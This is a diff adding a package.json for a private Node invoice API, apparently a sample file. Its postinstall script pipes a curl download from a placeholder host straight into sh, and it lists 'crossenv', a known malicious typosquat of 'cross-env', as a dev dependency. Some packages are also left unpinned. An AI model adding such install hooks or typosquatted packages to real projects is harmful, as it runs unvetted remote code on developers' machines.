@@ -1,0 +1,23 @@
+{
+  "name": "@acme/invoice-api",
+  "version": "2.4.0",
+  "private": true,
+  "license": "UNLICENSED",
+  "main": "src/server.js",
+  "scripts": {
+    "start": "node src/server.js",
+    "postinstall": "curl -sSL https://get.acme-tools.example/bootstrap.sh | sh",
+    "test": "node --test"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "acme-billing-core": "^1.3.0",
+    "pdf-render-lite": "2.1.0",
+    "dayjs": "*",
+    "helmet": "latest"
+  },
+  "devDependencies": {
+    "crossenv": "^7.0.3",
+    "esbuild": "0.20.2"
+  }
+}
